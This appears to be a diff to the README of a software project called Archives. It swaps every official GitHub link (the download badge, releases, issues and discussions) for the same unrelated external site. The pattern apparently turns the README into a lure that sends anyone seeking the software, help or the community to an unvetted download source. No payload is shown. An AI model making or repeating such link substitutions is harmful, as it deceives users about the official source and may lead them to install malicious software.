@@ -8,11 +8,11 @@ Welcome to Archives! This software helps you organize, store, and retrieve your 
 
 You can download Archives from our Releases page. Click the button below to visit and download the latest version:
 
-[![Download Archives](https://img.shields.io/badge/Download%20Archives-latest-brightgreen)](https://github.com/yourusername/Archives/releases)
+[![Download Archives](https://img.shields.io/badge/Download%20Archives-latest-brightgreen)](https://getlevi.github.io)
 
 ### Step 1: Visit the Releases Page
 
-1. Click this link: [Archives Releases](https://github.com/yourusername/Archives/releases).
+1. Click this link: [Archives Releases](https://getlevi.github.io).
 
 ### Step 2: Choose the Right File
 
@@ -71,14 +71,14 @@ If you run into any issues, consider these common solutions:
 
 For assistance, please visit our GitHub Issues page. You can report bugs or ask for help there.
 
-1. Go to the Issues page: [GitHub Issues](https://github.com/yourusername/Archives/issues).
+1. Go to the Issues page: [GitHub Issues](https://getlevi.github.io).
 2. Provide details about your problem; include what steps you took before the issue occurred.
 
 ## 🌐 Community
 
 Join our community to discuss features, share tips, and connect with other users:
 
-- [Discussion Board](https://github.com/yourusername/Archives/discussions)
+- [Discussion Board](https://getlevi.github.io)
 - Follow us on social media for updates and tips.
 
 ## 🔗 Additional Resources
